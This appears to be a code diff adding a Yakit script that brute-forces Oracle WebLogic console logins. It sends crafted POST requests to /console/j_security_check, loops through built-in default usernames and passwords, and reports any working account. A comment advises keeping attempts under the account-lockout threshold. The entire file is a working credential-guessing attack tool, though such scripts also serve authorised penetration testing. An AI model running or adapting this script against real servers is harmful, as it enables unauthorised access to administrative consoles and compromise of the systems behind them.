@@ -1,0 +1,88 @@
+log.setLevel("info") 
+yakit.AutoInitYakit()
+sendPacket = func(target, uname,passwd) {
+    return poc.HTTP(`POST /console/j_security_check HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: deflate
+Accept-Language: zh,zh-CN;q=0.9,en;q=0.8
+Cache-Control: max-age=0
+Content-Length: 70
+Content-Type: application/x-www-form-urlencoded
+Origin: http://{{params(target)}}
+Referer: http://{{params(target)}}/console/login/LoginForm.jsp
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
+
+j_username={{params(uname)}}&j_password={{params(passwd)}}&j_character_encoding=UTF-8`,
+        poc.params({
+            "target": target,
+            "uname": uname,
+            "passwd": passwd,
+        }),poc.noRedirect(true),//poc.proxy("http://127.0.0.1:8083"),
+    )
+}
+
+
+// 获取参数
+target = cli.String("target")
+if target == "" {
+    die("no target")
+}
+
+
+
+users = cli.LineDict("users")
+ulen =len(users)  
+if ulen  <1 {
+    users = []string{"system","weblogic","admin","joe","mary","wlcsystem","wlpisystem"}
+    // users = []string{"weblogic"}
+    ulen =len(users)  
+}
+
+
+pwds = cli.LineDict("pwds")
+
+plen = len(pwds)
+if plen  <1 {
+    pwds = []string{"weblogic","administrator","Oracle@123","wlpisystem"} // weblogic 爆破超过5次 会锁账号 4个密码 就行了 莫强求
+    // pwds = []string{"Oracle@123"}
+    plen =  len(pwds)
+}
+
+yakit.Info("Loading users number %d", ulen)
+yakit.Info("Loading pwds number %d ", plen)
+
+count = 0
+pro = 0
+percent = 200
+
+if plen*ulen > 200 {
+    percent = (plen*ulen)/10
+}
+
+for _, pwd = range pwds{
+    for _, user = range users{
+    count++
+
+    if count > percent {
+        count = 0
+        pro +=percent
+        yakit.Info("sended payload %d",pro)
+        yakit.SetProgress(float(pro)/(plen*ulen))
+    }
+
+    rsp, req, err = sendPacket(target, user,pwd)
+    die(err)
+    // println(string(rsp))
+    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+        if str.MatchAllOfSubString(body, "console</a>") {
+            yakit.Info("found weblogic weak acount %s/%s", user,pwd)
+            yakit.StatusCard("weblogic weak acount", user,pwd)
+            yakit.SetProgress(1)
+            die()
+        }
+    }
+}
+yakit.Info("script finished!!!")
+ yakit.SetProgress(1)
